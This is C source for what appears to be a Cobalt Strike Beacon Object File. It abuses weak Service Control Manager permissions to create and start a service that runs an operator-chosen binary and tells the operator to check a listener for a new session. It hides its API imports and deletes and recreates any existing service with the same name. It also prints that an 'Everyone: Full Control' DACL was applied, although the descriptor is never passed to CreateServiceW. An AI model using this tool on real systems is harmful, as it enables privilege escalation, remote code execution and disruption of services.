#include <windows.h>
#include "beacon.h"

/* -----------------------------------------------------------
   API Definitions for Dynamic Resolution (BOF Style)
   ----------------------------------------------------------- */
typedef SC_HANDLE (WINAPI * OpenSCManagerW_t)(LPCWSTR, LPCWSTR, DWORD);
typedef SC_HANDLE (WINAPI * CreateServiceW_t)(SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
typedef SC_HANDLE (WINAPI * OpenServiceW_t)(SC_HANDLE, LPCWSTR, DWORD);
typedef BOOL     (WINAPI * StartServiceW_t)(SC_HANDLE, DWORD, LPCWSTR*);
typedef BOOL     (WINAPI * DeleteService_t)(SC_HANDLE);
typedef BOOL     (WINAPI * CloseServiceHandle_t)(SC_HANDLE);
typedef BOOL     (WINAPI * ConvertStringSecurityDescriptorToSecurityDescriptorW_t)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR, PULONG);
typedef HLOCAL   (WINAPI * LocalFree_t)(HLOCAL);
typedef DWORD    (WINAPI * GetLastError_t)(void);  /* <-- added */

/* SDDL Constant for "Everyone: Full Control" */
#define SDDL_EVERYONE_FULL_CONTROL L"D:(A;;KA;;;WD)"
#define SDDL_REVISION_1 1

/* -----------------------------------------------------------
   Entry Point
   ----------------------------------------------------------- */
VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    datap parser;
    SC_HANDLE hScm = NULL;
    SC_HANDLE hSvc = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    SECURITY_ATTRIBUTES sa;
    wchar_t *svcName = NULL;
    wchar_t *binPath = NULL;
    int nameLen = 0, pathLen = 0;
    DWORD dwErr = 0;

    /* 1. Resolve APIs */
    OpenSCManagerW_t pOpenSCManagerW = (OpenSCManagerW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenSCManagerW");
    CreateServiceW_t pCreateServiceW = (CreateServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "CreateServiceW");
    OpenServiceW_t   pOpenServiceW   = (OpenServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenServiceW");
    StartServiceW_t  pStartServiceW  = (StartServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "StartServiceW");
    DeleteService_t  pDeleteService  = (DeleteService_t)GetProcAddress(GetModuleHandleA("advapi32"), "DeleteService");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(GetModuleHandleA("advapi32"), "CloseServiceHandle");
    ConvertStringSecurityDescriptorToSecurityDescriptorW_t pConvertSDDL =
        (ConvertStringSecurityDescriptorToSecurityDescriptorW_t)GetProcAddress(GetModuleHandleA("advapi32"),
        "ConvertStringSecurityDescriptorToSecurityDescriptorW");
    LocalFree_t    pLocalFree    = (LocalFree_t)GetProcAddress(GetModuleHandleA("kernel32"), "LocalFree");
    GetLastError_t pGetLastError = (GetLastError_t)GetProcAddress(GetModuleHandleA("kernel32"), "GetLastError"); /* <-- added */

    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW || !pConvertSDDL || !pGetLastError) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve APIs.");
        return;
    }

    /* 2. Parse Arguments (Expecting wstr, wstr) */
    BeaconDataParse(&parser, Buffer, Length);
    svcName = (wchar_t *)BeaconDataExtract(&parser, &nameLen);
    binPath = (wchar_t *)BeaconDataExtract(&parser, &pathLen);

    if (!svcName || !binPath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid arguments.");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target Service: %S", svcName);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Binary Path:    %S", binPath);

    /* 3. Open SCM with ALL_ACCESS */
    hScm = pOpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenSCManagerW failed (err: %lu). SCManager likely does not have weak permissions.", pGetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened SCM with ALL_ACCESS.");

    /* 4. Convert SDDL to Security Descriptor */
    if (!pConvertSDDL(SDDL_EVERYONE_FULL_CONTROL, SDDL_REVISION_1, &pSD, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SDDL conversion failed: %lu", pGetLastError());
        pCloseServiceHandle(hScm);
        return;
    }

    sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = pSD;
    sa.bInheritHandle       = FALSE;

    /* 5. Create the Service with the Weak DACL */
    hSvc = pCreateServiceW(
        hScm,
        svcName,
        NULL,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hSvc) {
        dwErr = pGetLastError();
        if (dwErr == ERROR_SERVICE_EXISTS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Service '%S' already exists. Attempting Open/Delete/Recreate...", svcName);

            hSvc = pOpenServiceW(hScm, svcName, SERVICE_ALL_ACCESS);
            if (hSvc) {
                pDeleteService(hSvc);
                pCloseServiceHandle(hSvc);
                hSvc = NULL;

                hSvc = pCreateServiceW(
                    hScm, svcName, NULL,
                    SERVICE_ALL_ACCESS,
                    SERVICE_WIN32_OWN_PROCESS,
                    SERVICE_DEMAND_START,
                    SERVICE_ERROR_IGNORE,
                    binPath,
                    NULL, NULL, NULL, NULL, NULL
                );
                if (!hSvc) {
                    BeaconPrintf(CALLBACK_ERROR, "[-] CreateService failed after deletion: %lu", pGetLastError());
                    goto cleanup;
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] OpenService failed for existing service: %lu", pGetLastError());
                goto cleanup;
            }
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] CreateServiceW failed: %lu", dwErr);
            goto cleanup;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service Created with Weak DACL (Everyone: FullControl).");

    /* 6. Start the Service */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting Service...");
    if (!pStartServiceW(hSvc, 0, NULL)) {
        dwErr = pGetLastError();
        if (dwErr == ERROR_SERVICE_REQUEST_TIMEOUT) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] StartService returned 1053 (Timeout). Expected for non-service binaries.");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Check your listener for a new session!");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] StartService failed: %lu", dwErr);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started successfully.");
    }

    /* 7. Mark Service for Deletion (Cleanup) */
    if (hSvc) {
        pDeleteService(hSvc);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service marked for deletion.");
    }

cleanup:
    if (hSvc) pCloseServiceHandle(hSvc);
    if (hScm) pCloseServiceHandle(hScm);
    if (pSD)  pLocalFree(pSD);
}
